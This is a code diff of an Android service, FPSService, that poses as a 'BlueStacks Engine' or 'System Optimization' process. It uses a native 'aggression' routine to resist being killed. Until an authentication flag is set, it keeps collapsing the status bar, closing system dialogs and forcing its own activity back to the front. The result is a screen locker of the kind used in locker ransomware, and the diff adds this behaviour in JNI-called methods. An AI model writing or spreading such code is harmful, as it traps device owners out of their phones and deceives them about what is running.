@@ -4,19 +4,16 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.os.IBinder;
 import android.os.Build;
-import android.os.PowerManager;
 import android.os.Handler;
-import java.lang.reflect.Method;
+import android.os.Looper;
 import android.content.pm.ServiceInfo;
+import java.lang.reflect.Method;
 
 public class FPSService extends Service {
-
 
     static {
         System.loadLibrary("fps-native");
@@ -25,18 +22,51 @@ public class FPSService extends Service {
     public native void startNativeAggression(String serviceName);
     public native void stopNativeAggression();
 
-    private BroadcastReceiver screenReceiver = new BroadcastReceiver() {
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
-                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-                PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "BS_FPS:WakeLock");
-                wakeLock.acquire(1000);
-            }
-        }
-    };
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
 
-    private void collapseStatusBar() {
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        startInForeground();
+        
+        // Panggil native aggression
+        startNativeAggression(getPackageName() + "/.FPSService");
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        return START_STICKY;
+    }
+
+    private void startInForeground() {
+        String CHANNEL_ID = "fps_overlay_channel";
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    CHANNEL_ID, "BlueStacks Engine Service",
+                    NotificationManager.IMPORTANCE_LOW);
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) manager.createNotificationChannel(channel);
+        }
+
+        Notification.Builder builder = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ?
+                new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
+
+        Notification notification = builder
+                .setContentTitle("System Optimization Running")
+                .setSmallIcon(android.R.drawable.ic_menu_manage)
+                .setOngoing(true)
+                .build();
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+        } else {
+            startForeground(1, notification);
+        }
+    }
+
+    // Dipanggil oleh Native via JNI
+    public void collapseStatusBar() {
         try {
             Object statusBarService = getSystemService("statusbar");
             Class<?> statusBarManager = Class.forName("android.app.StatusBarManager");
@@ -48,94 +78,30 @@ public class FPSService extends Service {
         }
     }
 
-    @Override
-    public IBinder onBind(Intent intent) { return null; }
-
-    private void initSystemOptimization() {
-        Handler handler = new Handler();
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                // Cek status di sini
-                boolean isCurrentlyAuthenticated = getSharedPreferences("AUTH_PREFS", MODE_PRIVATE)
-                                                            .getBoolean("is_authenticated", false);
-
-                if (!isCurrentlyAuthenticated) {
-                    collapseStatusBar();
-                    closeSystemDialogs();
-                    handler.postDelayed(this, 100);
-                } else {
-                    // Berhenti looping jika sudah benar
-                    stopNativeAggression(); 
-                }
-            }
-        }, 100);
+    // Dipanggil oleh Native via JNI
+    public void closeSystemDialogs() {
+        Intent closeDialogs = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
+        sendBroadcast(closeDialogs);
     }
 
-    private void closeSystemDialogs() {
-        try {
-            sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
-        } catch (Exception e) {}
-    }
-
-    private void refreshOverlay() {
-        // Method ini dipanggil dari native untuk memastikan overlay tetap di depan
-        Intent intent = new Intent(this, MainActivity.class);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-        startActivity(intent);
-    }
-
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        startInForeground();
-        initSystemOptimization();
-
-        // Tetap jalankan native aggression agar proses tidak bisa dimatikan
-        startNativeAggression(getPackageName() + "/.FPSService");
-
-        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
-        registerReceiver(screenReceiver, filter);
-    }
-
-    private void startInForeground() {
-        String CHANNEL_ID = "fps_overlay_channel";
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID, "BlueStacks Service",
-                    NotificationManager.IMPORTANCE_LOW);
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) manager.createNotificationChannel(channel);
-        }
-
-        Notification.Builder builder;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            builder = new Notification.Builder(this, CHANNEL_ID);
+    // Dipanggil oleh Native via JNI
+    public void refreshOverlay() {
+        // Cek dulu apakah sudah diautentikasi
+        boolean isAuth = getSharedPreferences("AUTH_PREFS", MODE_PRIVATE)
+                        .getBoolean("is_authenticated", false);
+        
+        if (!isAuth) {
+            Intent intent = new Intent(this, MainActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+            startActivity(intent);
         } else {
-            builder = new Notification.Builder(this);
-        }
-    
-        Notification notification = builder
-                .setContentTitle("BlueStacks Engine")
-                .setSmallIcon(android.R.drawable.ic_menu_view)
-                .setOngoing(true)
-                .build();
-    
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
-        } else {
-            startForeground(1, notification);
+            stopSelf();
         }
     }
 
     @Override
     public void onDestroy() {
+        stopNativeAggression();
         super.onDestroy();
-        stopNativeAggression(); // Pastikan mati
-        try { 
-            unregisterReceiver(screenReceiver); 
-        } catch (Exception e) {
-            // Abaikan jika sudah tidak terdaftar
-        }
     }
 }
